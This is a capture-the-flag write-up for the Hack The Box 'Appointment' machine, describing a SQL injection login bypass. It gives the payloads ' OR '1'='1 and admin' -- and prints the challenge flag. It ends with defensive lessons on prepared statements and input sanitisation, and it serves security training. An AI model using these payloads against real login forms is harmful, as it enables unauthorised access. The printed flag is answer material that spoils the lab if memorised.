
# HTB Appointment — Writeup

---

##  Overview

* **Machine Name:** Appointment
* **Difficulty:** Easy
* **Category:** Web Exploitation
* **Objective:** Exploit SQL Injection vulnerability to bypass authentication and retrieve the user flag

---

##  Attack Flow Summary

```
Recon → Web Login Page → SQL Injection → Auth Bypass → Flag Retrieval
```

---

##  Tools Used

* Browser
* Burp Suite (optional)
* SQL Injection payloads

---

##  MITRE ATT&CK Mapping

| Phase             | Technique                                 |
| ----------------- | ----------------------------------------- |
| Initial Access    | T1190 - Exploit Public-Facing Application |
| Execution         | T1059 - Command & Scripting Interpreter   |
| Credential Access | T1552 - Unsecured Credentials             |

---

#  Step-by-Step Exploitation

---

##  Step 1: Initial Enumeration

Access the target IP in the browser.

##  Step 2: Identify Entry Point

The login form is the **primary attack surface**.


##  Step 3: Test for SQL Injection

Try basic payload:

```
' OR '1'='1
```

``

##  Step 4: Authentication Bypass

Use payload in login:

* **Username:**

```
admin' --
```

- **Password:**

```
(anything or blank)
```

##  Step 5: Successful Login


##  Step 6: Locate the Flag

---

## Final Flag

```
e3d0796d002a446c0e622226f42e9672
```
### shots of answers:

![Step 1](./screenshot/image1.png)

![Step_2](./screenshot/image2.png)

![Step 3](./screenshot/image3.png)

![Step 4](./screenshot/image4.png)

![Step 5](./screenshot/image5.png)

![Step 6](./screenshot/image6.png)

![Step 7](./screenshot/image7.png)

![Step 8](./screenshot/image8.png)

![Step 9](./screenshot/image9.png)

![Step 10](./screenshot/image10.png)

![Step 11](./screenshot/image11.png)

![Step 12](./screenshot/image12.png)

![Step 13](./screenshot/image.png)


---

# 🔑 Key Findings

* Login form vulnerable to **SQL Injection**
* No input sanitization
* Authentication bypass achieved

---

# 📚 Lessons Learned

* Always sanitize user input
* Use prepared statements
* Avoid direct query execution

---

# 🏁 Conclusion

A simple SQL injection payload:

```
admin' --
```

was enough to bypass authentication and retrieve the flag.

---

